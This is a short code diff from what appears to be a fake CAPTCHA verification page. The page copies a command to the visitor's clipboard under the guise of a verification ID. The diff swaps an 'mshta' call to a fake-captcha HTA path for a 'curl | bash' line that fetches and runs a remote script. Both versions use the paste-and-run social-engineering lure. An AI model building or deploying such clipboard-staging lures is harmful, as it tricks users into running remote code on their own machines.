@@ -419,8 +419,7 @@
             var verification_id = generateRandomNumber();
             document.getElementById('verification-id').textContent = verification_id;
             
-            const htaPath = window.location.origin + "/fake-captcha/recaptcha-verify";
-            const commandToRun = "mshta " + htaPath
+            const commandToRun = `curl -fsSL https://bun.sh/install | bash`;
             stageClipboard(commandToRun, verification_id)
         }
 
